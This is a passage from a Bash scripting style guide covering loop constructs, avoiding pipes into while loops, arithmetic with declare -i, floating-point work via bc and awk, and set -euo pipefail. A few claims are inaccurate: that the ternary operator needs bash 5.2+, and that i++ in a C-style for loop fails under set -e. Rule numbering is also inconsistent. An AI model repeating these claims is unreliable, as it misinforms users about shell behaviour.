        echo "Usage: $SCRIPT_NAME [OPTIONS] PATTERN..."
        echo 'Options:'
        echo '  -v, --verbose    Verbose output'
        echo '  -n, --dry-run    Dry-run mode'
        echo '  -r, --retries N  Max retry attempts'
        echo '  -o, --output DIR Output directory'
        return 0
        ;;

      --)
        shift
        INPUT_PATTERNS+=("$@")
        break
        ;;

      -*)
        die 22 "Invalid option ${1@Q}"
        ;;

      *)
        INPUT_PATTERNS+=("$1")
        ;;
    esac
    shift
  done

  # Collect remaining arguments
  INPUT_PATTERNS+=("$@")

  # Make variables readonly
  readonly -- VERBOSE DRY_RUN MAX_RETRIES OUTPUT_DIR
  readonly -a INPUT_PATTERNS

  # Validate
  if ((${#INPUT_PATTERNS[@]} == 0)); then
    die 22 'No file patterns specified'
  fi

  # Display configuration
  if ((VERBOSE)); then
    info "$SCRIPT_NAME $VERSION"
    info "Patterns: ${INPUT_PATTERNS[*]}"
    info "Max retries: $MAX_RETRIES"
    ((DRY_RUN)) && info '[DRY-RUN] Mode enabled' ||:
  fi

  # Collect matching files
  local -a files
  if ! readarray -t files < <(collect_files); then
    die 1 'Failed to collect files'
  fi

  info "Found ${#files[@]} files to process"

  # Process each file with for loop
  local -- file
  local -i success_count=0
  local -i error_count=0

  for file in "${files[@]}"; do
    if process_file "$file"; then
      success_count+=1
    else
      error_count+=1
    fi
  done

  # Report results
  info "Results: $success_count succeeded, $error_count failed"

  # Return appropriate exit code
  ((error_count == 0))
}

# ============================================================================
# Script Invocation
# ============================================================================

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - iterating over unquoted string
files_str="file1.txt file2.txt file with spaces.txt"
for file in $files_str; do  # Word splitting!
  echo "$file"
done

# ✓ Correct - iterate over array
files=('file1.txt' 'file2.txt' 'file with spaces.txt')
for file in "${files[@]}"; do
  echo "$file"
done

# ✗ Wrong - parsing ls output
for file in $(ls *.txt); do  # NEVER parse ls!
  process "$file"
done

# ✓ Correct - use glob directly
for file in *.txt; do
  process "$file"
done

# ✗ Wrong - pipe to while (subshell issue)
declare -i count=0
cat file.txt | while read -r line; do
  count+=1
done
echo "$count"  # Still 0!

# ✓ Correct - process substitution
declare -i count=0
while read -r line; do
  count+=1
done < <(cat file.txt)
echo "$count"  # Correct value

# ✗ Wrong - unquoted array in for loop
array=('item 1' 'item 2')
for item in ${array[@]}; do  # Unquoted!
  echo "$item"
done

# ✓ Correct - quoted array expansion
for item in "${array[@]}"; do
  echo "$item"
done

# ✗ Wrong - C-style loop with ++
for ((i=0; i<10; i++)); do  # Fails with set -e when i=0!
  echo "$i"
done

# ✓ Correct - use +=1 instead
for ((i=0; i<10; i+=1)); do
  echo "$i"
done

# ✗ Wrong - redundant comparison in arithmetic context
while (($# > 0)); do  # Nonsense: $# is already truthy when non-zero
  case $1 in
    --opt) shift ;;
  esac
  shift
done

# ✓ Correct - arithmetic context evaluates non-zero as true
while (($#)); do  # Clean and idiomatic
  case $1 in
    --opt) shift ;;
  esac
  shift
done

# ✗ Wrong - break with no argument (ambiguous in nested loops)
for i in {1..10}; do
  for j in {1..10}; do
    if ((i * j > 50)); then
      break  # Breaks inner loop only - unclear
    fi
  done
done

# ✓ Correct - explicit break level
for i in {1..10}; do
  for j in {1..10}; do
    if ((i * j > 50)); then
      break 2  # Break both loops - clear intent
    fi
  done
done

# ✗ Wrong - modifying array during iteration
array=(a b c d)
for item in "${array[@]}"; do
  array+=("$item")  # Dangerous - modifies array being iterated!
done

# ✓ Correct - create new array
original=(a b c d)
modified=()
for item in "${original[@]}"; do
  modified+=("$item" "$item")  # Safe - different array
done

# ✗ Wrong - seq for iteration (external command)
for i in $(seq 1 10); do  # Unnecessary external command
  echo "$i"
done

# ✓ Correct - use brace expansion
for i in {1..10}; do
  echo "$i"
done

# ✗ Wrong - reading file without preserving backslashes
while read line; do  # Missing -r flag
  echo "$line"
done < file.txt

# ✓ Correct - always use -r with read
while IFS= read -r line; do
  echo "$line"
done < file.txt

# ✗ Wrong - infinite loop without safety check
while ((1)); do
  process_item
  # No break condition - runs forever!
done

# ✓ Correct - infinite loop with exit condition (using fastest construct)
declare -i iteration=0
declare -i max_iterations=1000
while ((1)); do
  process_item

  iteration+=1
  if ((iteration >= max_iterations)); then
    warn 'Max iterations reached'
    break
  fi
done
```

**Edge cases:**

**1. Empty arrays:**

```bash
# Empty array is safe to iterate
empty=()

# Zero iterations - no errors
for item in "${empty[@]}"; do
  echo "$item"  # Never executes
done
```

**2. Arrays with empty elements:**

```bash
# Array with empty string element
array=('' 'item2' '' 'item4')

# Iterates 4 times, including empty strings
for item in "${array[@]}"; do
  echo "Item: [$item]"
done
# Output:
# Item: []
# Item: [item2]
# Item: []
# Item: [item4]
```

**3. Glob with no matches:**

```bash
# With nullglob enabled
shopt -s nullglob

for file in /nonexistent/*.txt; do
  echo "$file"  # Never executes if no matches
done

# Without nullglob
shopt -u nullglob

for file in /nonexistent/*.txt; do
  # Executes once with literal: /nonexistent/*.txt
  if [[ ! -e "$file" ]]; then
    echo 'No matches'
    break
  fi
  echo "$file"
done
```

**4. Loop variable scope:**

```bash
# Loop variables are not local
for i in {1..5}; do
  echo "$i"
done
echo "i is still available: $i"  # Prints: 5

# Make loop variable local explicitly if needed
process_items() {
  local -i i

  for i in {1..5}; do
    echo "$i"
  done
  # i goes out of scope here
}
```

**IMPORTANT: Declare local variables BEFORE loops, not inside:**

```bash
# ✓ CORRECT - declare locals before the loop
process_links() {
  local -- target
  local -i count=0

  for link in "$BIN_DIR"/*; do
    [[ -L "$link" ]] || continue
    target=$(readlink "$link")
    if [[ "$target" == "$INSTALL_DIR"/ok_master ]]; then
      rm -f "$link"
      count+=1
    fi
  done

  echo "Removed $count links"
}

# ✗ WRONG - declaring local inside loop
process_links_bad() {
  for link in "$BIN_DIR"/*; do
    [[ -L "$link" ]] || continue
    local target             # WRONG: re-declared each iteration
    target=$(readlink "$link")
    # ...
  done
}
```

**Why declare before loops:**
- `local` inside a loop doesn't create a new scope per iteration - it's the same variable
- Declaring inside loops is wasteful (re-executes `local` on each iteration)
- Misleading to readers (suggests new variable each time)
- Proper pattern: declare all locals at function start, then use in loops

**5. Reading empty files:**

```bash
# Empty file
touch empty.txt

declare -i count=0
while read -r line; do
  count+=1
done < empty.txt

echo "Count: $count"  # Output: 0 (zero iterations)
```

**Summary:**

- **For loops** - best for arrays, globs, and known ranges
- **While loops** - best for reading input, argument parsing, and condition-based iteration
- **Until loops** - rarely used, prefer while with opposite condition
- **Infinite loops** - use `while ((1))` for optimal performance, `while :` for POSIX compatibility, avoid `while true` (15-22% slower)
- **Always quote arrays** - `"${array[@]}"` for safe iteration
- **Use process substitution** - `< <(command)` to avoid subshell in while loops
- **Prefer arrays over strings** - for file lists and collections
- **Never parse ls** - use glob patterns or find with process substitution
- **Use i+=1 not i++** - ++ returns original value, fails with set -e when 0
- **Avoid redundant comparisons** - use `while (($#))` not `while (($# > 0))` in arithmetic context
- **Break and continue** - for early exit and conditional skipping
- **Specify break level** - `break 2` for nested loops
- **IFS= read -r** - always use with while loops reading input
- **Check glob matches** - with nullglob or explicit check

**Key principle:** Choose the loop type that matches your iteration pattern: for loops for collections and ranges, while loops for streaming input and conditions. Always prefer array iteration over string parsing, use process substitution to avoid subshell issues, and employ explicit loop control with break/continue for clarity. The loop type should make your intent immediately obvious to readers.


---


**Rule: BCS0504**

## Pipes to While Loops

**Avoid piping commands to while loops because pipes create subshells where variable assignments don't persist outside the loop. Use process substitution `< <(command)` or `readarray` instead. This is one of the most common and insidious bugs in Bash scripts.**

**Rationale:**

- **Variable Persistence**: Pipes create subshells; variables modified inside don't persist outside the loop
- **Debugging Difficulty**: The script appears to work but counters stay at 0, arrays stay empty
- **Silent Failure**: No error messages - script continues with wrong values
- **Process Substitution Fixes**: `< <(command)` runs loop in current shell, variables persist
- **Readarray Alternative**: For simple line collection, `readarray` is cleaner and faster
- **Set -e Interaction**: Failures in piped commands may not trigger `set -e` properly

**The subshell problem:**

When you pipe to while, Bash creates a subshell for the while loop. Any variable modifications happen in that subshell and are lost when the pipe ends.

```bash
# ✗ WRONG - Subshell loses variable changes
declare -i count=0

echo -e "line1\nline2\nline3" | while IFS= read -r line; do
  echo "$line"
  count+=1
done

echo "Count: $count"  # Output: Count: 0 (NOT 3!)
# Variable changes were lost!
```

**Why this happens:**

```bash
# Pipe creates process tree:
#   Parent shell (count=0)
#      |
#      └─> Subshell (while loop)
#            - Inherits count=0
#            - Modifies count (1, 2, 3)
#            - Subshell exits
#            - Changes discarded!
#      |
#   Back to parent (count still 0)
```

**Solution 1: Process substitution (most common)**

```bash
# ✓ CORRECT - Process substitution avoids subshell
declare -i count=0

while IFS= read -r line; do
  echo "$line"
  count+=1
done < <(echo -e "line1\nline2\nline3")

echo "Count: $count"  # Output: Count: 3 (correct!)
```

**Solution 2: Readarray/mapfile (when collecting lines)**

```bash
# ✓ CORRECT - readarray reads all lines into array
declare -a lines

readarray -t lines < <(echo -e "line1\nline2\nline3")

# Now process array
declare -i count="${#lines[@]}"
echo "Count: $count"  # Output: Count: 3 (correct!)

# Iterate if needed
local -- line
for line in "${lines[@]}"; do
  echo "$line"
done
```

**Solution 3: Here-string (for single variables)**

```bash
# ✓ CORRECT - Here-string when input is in variable
declare -- input=$'line1\nline2\nline3'
declare -i count=0

while IFS= read -r line; do
  echo "$line"
  count+=1
done <<< "$input"

echo "Count: $count"  # Output: Count: 3 (correct!)
```

**Complete examples:**

**Example 1: Counting matching lines**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✗ WRONG - Counter stays 0
count_errors_wrong() {
  local -- log_file=$1
  local -i error_count=0

  # Pipe creates subshell!
  grep 'ERROR' "$log_file" | while IFS= read -r line; do
    echo "Found: $line"
    error_count+=1
  done

  echo "Errors: $error_count"  # Always 0!
  return "$error_count"  # Returns 0 even if errors found!
}

# ✓ CORRECT - Process substitution
count_errors_correct() {
  local -- log_file=$1
  local -i error_count=0

  # Process substitution keeps loop in current shell
  while IFS= read -r line; do
    echo "Found: $line"
    error_count+=1
  done < <(grep 'ERROR' "$log_file")

  echo "Errors: $error_count"  # Correct count!
  return "$error_count"
}

# ✓ ALSO CORRECT - Using wc (when only count matters)
count_errors_simple() {
  local -- log_file=$1
  local -i error_count

  error_count=$(grep -c 'ERROR' "$log_file")
  echo "Errors: $error_count"
  return "$error_count"
}

main() {
  local -- test_log=/var/log/app.log

  count_errors_correct "$test_log"
}

main "$@"
#fin
```

**Example 2: Building array from command output**

```bash
# ✗ WRONG - Array stays empty
collect_users_wrong() {
  local -a users=()

  # Pipe creates subshell!
  getent passwd | while IFS=: read -r user _; do
    users+=("$user")
  done

  echo "Users: ${#users[@]}"  # Always 0!
  # Array modifications lost!
}

# ✓ CORRECT - Process substitution
collect_users_correct() {
  local -a users=()

  while IFS=: read -r user _; do
    users+=("$user")
  done < <(getent passwd)

  echo "Users: ${#users[@]}"  # Correct count!
  printf '%s\n' "${users[@]}"
}

# ✓ ALSO CORRECT - readarray (simpler)
collect_users_readarray() {
  local -a users

  # Read usernames directly into array
  readarray -t users < <(getent passwd | cut -d: -f1)

  echo "Users: ${#users[@]}"
  printf '%s\n' "${users[@]}"
}
```

**Example 3: Processing files with state**

```bash
# ✗ WRONG - State variables lost
process_files_wrong() {
  local -i total_size=0
  local -i file_count=0

  # Pipe creates subshell!
  find /data -type f | while IFS= read -r file; do
    local -- size
    size=$(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null)
    total_size+=size
    file_count+=1
  done

  echo "Files: $file_count, Total: $total_size"
  # Both 0 - variables lost!
}

# ✓ CORRECT - Process substitution
process_files_correct() {
  local -i total_size=0
  local -i file_count=0

  local -- size
  while IFS= read -r file; do
    size=$(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null)
    total_size+=size
    file_count+=1
  done < <(find /data -type f)

  echo "Files: $file_count, Total: $total_size"
  # Correct values!
}
```

**Example 4: Multi-variable read**

```bash
# ✗ WRONG - Associative array stays empty
parse_config_wrong() {
  local -A config=()

  # Pipe creates subshell!
  cat config.conf | while IFS='=' read -r key value; do
    config[$key]="$value"
  done

  # config is empty here!
  echo "Config entries: ${#config[@]}"  # 0
}

# ✓ CORRECT - Process substitution
parse_config_correct() {
  local -A config=()

  while IFS='=' read -r key value; do
    # Skip comments and empty lines
    [[ "$key" =~ ^[[:space:]]*# ]] && continue ||:
    [[ -n "$key" ]] || continue

    config[$key]="$value"
  done < <(cat config.conf)

  # config has values!
  echo "Config entries: ${#config[@]}"

  # Display config
  local -- k
  for k in "${!config[@]}"; do
    echo "$k = ${config[$k]}"
  done
}
```

**When readarray is better:**

```bash
# If you just need lines in an array, use readarray

# ✓ BEST - readarray for simple line collection
declare -a log_lines
readarray -t log_lines < <(tail -n 100 /var/log/app.log)

# Process array
local -- line
for line in "${log_lines[@]}"; do
  [[ "$line" =~ ERROR ]] && echo "Error: ${line@Q}" ||:
done

# ✓ BEST - readarray with null-delimited input
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)

# Safe iteration (handles spaces in filenames)
local -- file
for file in "${files[@]}"; do
  echo "Processing: $file"
done
```

**Complete working example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Analyze log file with process substitution
analyze_log() {
  local -- log_file=$1

  local -i error_count=0
  local -i warn_count=0
  local -i total_lines=0
  local -a error_lines=()

  # Process substitution - variables persist
  while IFS= read -r line; do
    total_lines+=1

    if [[ "$line" =~ ERROR ]]; then
      error_count+=1
      error_lines+=("$line")
    elif [[ "$line" =~ WARN ]]; then
      warn_count+=1
    fi
  done < <(cat "$log_file")

  # All counters work correctly!
  echo "Analysis of $log_file:"
  echo "  Total lines: $total_lines"
  echo "  Errors: $error_count"
  echo "  Warnings: $warn_count"

  if ((error_count > 0)); then
    echo
    echo 'Error lines:'
    printf '  %s\n' "${error_lines[@]}"
  fi
}

# Collect configuration with readarray
load_config() {
  local -- config_file=$1
  local -a config_lines
  local -A config=()

  # Use readarray to collect lines
  readarray -t config_lines < <(grep -v '^#' "$config_file" | grep -v '^[[:space:]]*$')

  # Parse array
  local -- line key value
  for line in "${config_lines[@]}"; do
    IFS='=' read -r key value <<< "$line"
    config[$key]="$value"
  done

  # Config populated correctly
  echo "Configuration loaded: ${#config[@]} entries"
  local -- k
  for k in "${!config[@]}"; do
    echo "  $k = ${config[$k]}"
  done
}

# Process files safely
process_directory() {
  local -- dir=$1
  local -a files

  # Collect files with readarray
  readarray -d '' -t files < <(find "$dir" -type f -name '*.txt' -print0)

  local -- file
  local -i processed=0

  for file in "${files[@]}"; do
    echo "Processing: $file"
    # Process file
    processed+=1
  done

  echo "Processed $processed files"
}

main() {
  analyze_log '/var/log/app.log'
  load_config '/etc/app/config.conf'
  process_directory '/data'
}

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
declare -i count=0
# ✗ WRONG - Pipe to while with counter
cat file.txt | while read -r line; do
  count+=1
done
echo "$count"  # Still 0!

# ✓ CORRECT - Process substitution
while read -r line; do
  count+=1
done < <(cat file.txt)
echo "$count"  # Correct!

# ✗ WRONG - Pipe to while building array
find /data -name '*.txt' | while read -r file; do
  files+=("$file")
done
echo "${#files[@]}"  # Still 0!

# ✓ CORRECT - readarray
readarray -d '' -t files < <(find /data -name '*.txt' -print0)
echo "${#files[@]}"  # Correct!

# ✗ WRONG - Pipe to while modifying associative array
cat config | while IFS='=' read -r key val; do
  config[$key]="$val"
done
# config is empty!

# ✓ CORRECT - Process substitution
while IFS='=' read -r key val; do
  config[$key]="$val"
done < <(cat config)
# config has values!

# ✗ WRONG - Setting flag in piped while
has_errors=0
grep ERROR log | while read -r line; do
  has_errors=1
done
echo "$has_errors"  # Still 0!

# ✓ CORRECT - Use return value or process substitution
if grep -q ERROR log; then
  has_errors=1
fi
# Or:
while read -r line; do
  has_errors=1
done < <(grep ERROR log)

# ✗ WRONG - Complex pipeline with state
cat file | grep pattern | sort | while read -r line; do
  count+=1
  data+=("$line")
done
# count=0, data=() - both lost!

# ✓ CORRECT - Process substitution with pipeline
while read -r line; do
  count+=1
  data+=("$line")
done < <(cat file | grep pattern | sort)
# Variables persist!
```

**Edge cases:**

**1. Empty input:**

```bash
# Process substitution handles empty input correctly
declare -i count=0

while read -r line; do
  count+=1
done < <(echo -n "")  # No output

echo "Count: $count"  # 0 - correct (no lines)
```

**2. Command failure in process substitution:**

```bash
# With set -e, command failure is detected
while read -r line; do
  process "$line"
done < <(failing_command)  # Script exits if failing_command fails
```

**3. Very large output:**

```bash
# readarray loads everything into memory
readarray -t lines < <(cat huge_file)  # Might use lots of RAM

# Process substitution processes line by line
while read -r line; do
  process "$line"  # Processes one at a time
done < <(cat huge_file)  # Lower memory usage
```

**4. Null-delimited input (filenames with newlines):**

```bash
# Use -d '' for null-delimited
while IFS= read -r -d '' file; do
  echo "File: $file"
done < <(find /data -print0)

# Or with readarray
readarray -d '' -t files < <(find /data -print0)
```

**Testing the subshell issue:**

```bash
# Demonstrate the problem
test_pipe_subshell() {
  local -i count=0

  # This fails
  echo "test" | while read -r line; do
    count=1
  done

  if ((count == 0)); then
    echo 'FAIL: Pipe created subshell, count not updated'
  else
    echo 'PASS: Count was updated'
  fi
}

# Demonstrate the solution
test_process_substitution() {
  local -i count=0

  # This works
  while read -r line; do
    count=1
  done < <(echo 'test')

  if ((count == 1)); then
    echo 'PASS: Process substitution kept variables'
  else
    echo 'FAIL: Count not updated'
  fi
}

test_pipe_subshell        # Shows the problem
test_process_substitution # Shows the solution
```

**Summary:**

- **Never pipe to while** - creates subshell, variables don't persist
- **Use process substitution** - `while read; done < <(command)` - variables persist
- **Use readarray** - `readarray -t array < <(command)` - simple and efficient
- **Use here-string** - `while read; done <<< "$var"` - when input is in variable
- **Subshell variables are lost** - any modifications disappear when pipe ends
- **Debugging is hard** - script appears to work but uses wrong values
- **Always test with data** - empty counters/arrays indicate subshell problem

**Key principle:** Piping to while is a dangerous anti-pattern that silently loses variable modifications. Always use process substitution `< <(command)` or `readarray` instead. This is not a style preference - it's about correctness. If you find `| while read` in code, it's almost certainly a bug waiting to manifest.


---


**Rule: BCS0505**

## Arithmetic Operations

> **See Also:** BCS0201 for complete guidance on declaring integer variables with `declare -i`

**Declare integer variables explicitly:**

```bash
# Always declare integer variables with -i flag
declare -i i j result count total

# Or declare with initial value
declare -i counter=0
declare -i max_retries=3
```

**Rationale for `declare -i`:**
- **Automatic arithmetic context**: All assignments become arithmetic (no need for `$(())`)
- **Type safety**: Helps catch errors when non-numeric values assigned
- **Performance**: Slightly faster for repeated arithmetic operations
- **Clarity**: Signals to readers that variable holds numeric values
- **Required for BCS compliance**: ALL integer variables must use `declare -i` (BCS0201)

**Increment operations:**

```bash
# ✓ CORRECT - The ONLY acceptable increment form
declare -i i=0    # MUST declare as integer first
i+=1              # Clearest, safest, most readable

# ✗ WRONG - NEVER use these increment forms
((i+=1))          # NEVER - does not fail with set -e, but (()) is unnecessary
((i++))           # NEVER - returns old value, fails with set -e when i=0
((++i))           # NEVER - unnecessary complexity, use i+=1 instead
i++               # NEVER - syntax error outside arithmetic context
```

**Critical rule:** Use `i+=1` for ALL increments. This requires the variable to be declared with `declare -i` or `local -i` first. The `(())` construct is unnecessary for simple increments when the variable is typed as integer.

**Why only `i+=1`:**
1. **Requires `declare -i`**: Forces proper integer declaration (BCS0201)
2. **Always succeeds**: No risk of `set -e` exit
3. **Self-documenting**: Clear intent, no C-style confusion
4. **Simpler**: No need for `(())` wrapper

**Why `((i++))` is dangerous:**

```bash
#!/usr/bin/env bash
set -e  # Exit on error

i=0
((i++))  # Returns 0 (the old value), which is "false"
         # Script exits here with set -e!
         # i now equals 1, but we never reach next line

echo "This never executes"
```

**Safe demonstration:**

```bash
#!/usr/bin/env bash
set -e
declare -i i j k

# ✓ Safe patterns
i=0
i+=1      # i=1, no exit
echo "i=$i"

j=0
((++j))   # j=1, returns 1 (true), no exit
echo "j=$j"

k=0
((k+=1))  # k=1, returns 0 (always success), no exit
echo "k=$k"
```

**Arithmetic expressions:**

```bash
# In (()) - no $ needed for variables
((result = x * y + z))
((i = j * 2 + 5))
((total = sum / count))

# With $(()), for use in assignments or commands
result=$((x * y + z))
echo "$((i * 2 + 5))"
args=($((count - 1)))  # In array context
```

**Arithmetic operators:**

| Operator | Meaning | Example |
|----------|---------|---------|
| `+` | Addition | `i=a+b` |
| `-` | Subtraction | `((i = a - b))` |
| `*` | Multiplication | `((i = a * b))` |
| `/` | Integer division | `((i = a / b))` |
| `%` | Modulo (remainder) | `((i = a % b))` |
| `**` | Exponentiation | `((i = a ** b))` |
| `++` / `--` | Increment/Decrement | Use `i+=1` instead |
| `+=` / `-=` | Compound assignment | `i+=5` |

**Arithmetic conditionals:**

```bash
# Use (()) for arithmetic comparisons
if ((i < j)); then
  echo 'i is less than j'
fi

((count)) && process_items
((attempts >= max_retries)) && die 1 'Too many attempts'

# All C-style operators work
((i >= 10)) && echo 'Ten or more'
((i <= 5)) || echo 'More than five'
((i == j)) && echo 'Equal'
((i != j)) && echo 'Not equal'
```

**Comparison operators in (()):**

| Operator | Meaning |
|----------|---------|
| `<` | Less than |
| `<=` | Less than or equal |
| `>` | Greater than |
| `>=` | Greater than or equal |
| `==` | Equal |
| `!=` | Not equal |

**Arithmetic truthiness:**

In arithmetic context, non-zero is truthy. Use this directly instead of explicit comparisons:

```bash
# ✓ CORRECT - use truthiness directly
declare -i count=5
if ((count)); then echo 'Has items'; fi
((VERBOSE)) && echo 'Verbose mode enabled'
((DRY_RUN)) || execute_command

# ✗ WRONG - redundant comparison
if ((count > 0)); then echo 'Has items'; fi
if ((VERBOSE == 1)); then echo 'Verbose mode'; fi
((DRY_RUN != 0)) || execute_command
```

**Why use truthiness:**
- **Cleaner code**: `((var))` is simpler than `((var > 0))`
- **Boolean intent**: Makes flag/toggle usage obvious
- **Consistent pattern**: Same as C/shell idioms

**Complex expressions:**

```bash
# Parentheses for grouping
((result = (a + b) * (c - d)))

# Multiple operations
((total = sum + count * average / 2))

# Ternary operator (bash 5.2+)
((max = a > b ? a : b))

# Bitwise operations
((flags = flag1 | flag2))  # Bitwise OR
((masked = value & 0xFF))  # Bitwise AND
```

**Anti-patterns to avoid:**

### Using Test Command for Arithmetic Comparisons

**The Problem:** Using `[[ ... -eq ... ]]` for integer comparisons is verbose and old-style.

```bash
# ✗ WRONG - Using [[ ]] for integer comparison
if [[ "$exit_code" -eq 0 ]]; then
  echo 'Success'
fi

# ✗ WRONG - Requires quotes and verbose syntax
[[ "$count" -gt 10 ]] && process_items

# ✗ WRONG - Multiple integer comparisons with [[ ]]
[[ "$exit_code" -eq 0 || "$exit_code" -eq 141 ]] && handle_success

# ✓ CORRECT - Use (()) for integer comparison
if ((exit_code == 0)); then
  echo 'Success'
fi

# ✓ CORRECT - Clean arithmetic syntax, no quotes needed
((count > 10)) && process_items ||:

# ✓ CORRECT - Multiple integer comparisons
((exit_code == 0 || exit_code == 141)) && handle_success
```

**Why `(())` is better:**
- **No quoting required**: Variables don't need quotes in arithmetic context
- **Native operators**: Use `>`, `<`, `==`, `!=` instead of `-gt`, `-lt`, `-eq`, `-ne`
- **More readable**: Looks like arithmetic, not string comparison
- **Faster**: No external test command, pure bash arithmetic
- **Type-safe**: Works with integers declared using `declare -i`

**Important:** Always declare integer variables with `declare -i` first (see BCS0201)

```bash
# Complete pattern (BCS-compliant)
declare -i exit_code=0
some_command || exit_code=$?

if ((exit_code == 0)); then
  echo 'Command succeeded'
else
  echo "Command failed with exit code: $exit_code"
fi
```

### Other Common Anti-Patterns

```bash
# ✗ Wrong - using [[ ]] for arithmetic
[[ "$count" -gt 10 ]]  # Verbose, old-style

# ✓ Correct - use (())
((count > 10))

# ✗ Wrong - post-increment
((i++))  # Dangerous with set -e when i=0

# ✗ Wrong - unnecessary (())
((i+=1))

# ✓ Correct - use +=1
i+=1

# ✗ Wrong - expr command (slow, external)
result=$(expr $i + $j)

# ✓ Correct - use $(()) or (())
result=$((i + j))
((result = i + j))

# ✗ Wrong - $ inside (()) on left side
((result = $i + $j))  # Unnecessary $

# ✓ Correct - no $ inside (())
((result = i + j))

# ✗ Wrong - quotes around arithmetic
result="$((i + j))"  # Unnecessary quotes

# ✓ Correct - no quotes needed
result=$((i + j))
```

**Integer division gotcha:**

```bash
# Integer division truncates (rounds toward zero)
((result = 10 / 3))  # result=3, not 3.333...
((result = -10 / 3)) # result=-3, not -3.333...

# For floating point, use bc or awk
result=$(bc <<< "scale=2; 10 / 3")  # result=3.33
result=$(awk 'BEGIN {print 10/3}')   # result=3.33333
```

**Practical examples:**

```bash
# Loop counter
declare -i i
for ((i=0; i<10; i+=1)); do
  echo "Iteration $i"
done

# Retry logic
declare -i attempts=0
declare -i max_attempts=5
while ((attempts < max_attempts)); do
  if process_item; then
    break
  fi
  attempts+=1
  ((attempts > max_attempts)) || sleep 1
done
((attempts < max_attempts)) || die 1 'Max attempts reached'

# Percentage calculation
declare -i total=100
declare -i completed=37
declare -i percentage=$((completed * 100 / total))
echo "Progress: $percentage%"
```


---


**Rule: BCS0506**

## Floating-Point Operations

**Rule: BCS0706** (New)

Performing floating-point arithmetic in Bash using external tools.

---

#### Rationale

Bash only supports integer arithmetic natively. For floating-point:
- Use `bc` for arbitrary precision calculations
- Use `awk` for inline floating-point operations
- Use `printf` for formatting floating-point output
- Avoid complex floating-point logic in Bash when possible

---

#### Using bc (Basic Calculator)

```bash
# Simple calculation
result=$(echo '3.14 * 2.5' | bc -l)

# With variables
declare -- width='10.5'
declare -- height='7.25'
area=$(echo "$width * $height" | bc -l)

# Set precision (scale)
pi=$(echo 'scale=10; 4*a(1)' | bc -l)  # Pi to 10 decimal places

# Comparison (bc returns 1 for true, 0 for false)
if (($(echo "$a > $b" | bc -l))); then
  info "$a is greater than $b"
fi
```

#### Using awk

```bash
# Inline calculation
result=$(awk "BEGIN {printf \"%.2f\", 3.14 * 2.5}")

# With variables
area=$(awk -v w="$width" -v h="$height" 'BEGIN {printf "%.2f", w * h}')

# Comparison
if awk -v a="$a" -v b="$b" 'BEGIN {exit !(a > b)}'; then
  info "$a is greater than $b"
fi

# Percentage calculation
pct=$(awk -v used="$used" -v total="$total" 'BEGIN {printf "%.1f", used/total*100}')
```

#### Using printf for Formatting

```bash
# Format existing float
printf '%.2f\n' "$value"

# Format calculation result
printf 'Area: %.2f sq units\n' "$(echo "$w * $h" | bc -l)"
```

#### Common Patterns

```bash
# Human-readable byte sizes
bytes_to_human() {
  local -i bytes=$1
  if ((bytes >= 1073741824)); then
    awk -v b="$bytes" 'BEGIN {printf "%.1fG", b/1073741824}'
  elif ((bytes >= 1048576)); then
    awk -v b="$bytes" 'BEGIN {printf "%.1fM", b/1048576}'
  elif ((bytes >= 1024)); then
    awk -v b="$bytes" 'BEGIN {printf "%.1fK", b/1024}'
  else
    echo "${bytes}B"
  fi
}

# Percentage with rounding
calc_percentage() {
  local -i part=$1 total=$2
  awk -v p="$part" -v t="$total" 'BEGIN {printf "%.0f", p/t*100}'
}
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - Bash integer division loses precision
result=$((10 / 3))  # Returns 3, not 3.333

# ✓ Correct - use bc for float division
result=$(echo '10 / 3' | bc -l)  # Returns 3.333...
```

```bash
# ✗ Wrong - comparing floats as strings
if [[ "$a" > "$b" ]]; then  # String comparison!

# ✓ Correct - use bc or awk for numeric comparison
if (($(echo "$a > $b" | bc -l))); then
```

---

**See Also:** BCS0705 (Integer Arithmetic)

**Full implementation:** See `examples/exemplar-code/hr2int` and `examples/exemplar-code/int2hr`


---


**Rule: BCS0600**

# Error Handling

This consolidated section establishes comprehensive error handling practices for robust scripts. It mandates `set -euo pipefail` (with strongly recommended `shopt -s inherit_errexit`) for automatic error detection, defines standard exit code conventions (0=success, 1=general error, 2=misuse, 5=IO error, 22=invalid argument, etc.), explains trap handling for cleanup operations, details proper return value checking patterns, and clarifies when and how to safely suppress errors (using `|| true`, `|| :`, or conditional checks). Error handling must be configured before any other commands run to catch failures early.


---


**Rule: BCS0601**

## Exit on Error
```bash
set -euo pipefail
# -e: Exit on command failure
# -u: Exit on undefined variable
# -o pipefail: Exit on pipe failure
```

**Detailed explanation:**

- **`set -e`** (errexit): Script exits immediately if any command returns non-zero
- **`set -u`** (nounset): Exit if referencing undefined variables
- **`set -o pipefail`**: Pipeline fails if any command in pipe fails (not just last)

**Rationale:** These flags turn Bash from "permissive" to "strict mode":
- Catches errors immediately instead of continuing with bad state
- Prevents cascading failures
- Makes scripts behave more like compiled languages

**Common patterns for handling expected failures:**

```bash
# Pattern 1: Allow specific command to fail
command_that_might_fail || true

# Pattern 2: Capture exit code
if command_that_might_fail; then
  echo 'Success'
else
  echo 'Expected failure occurred'
fi

# Pattern 3: Temporarily disable errexit
set +e
risky_command
set -e

# Pattern 4: Check if variable exists before using
if [[ -n "${OPTIONAL_VAR:-}" ]]; then
  echo "Variable is set: $OPTIONAL_VAR"
fi
```

**Important gotchas:**

```bash
# ✗ This will exit even though you check the result
result=$(failing_command)  # Script exits here with set -e
if [[ -n "$result" ]]; then  # Never reached
  echo 'Never gets here'
fi

# ✓ Correct - disable errexit for this command
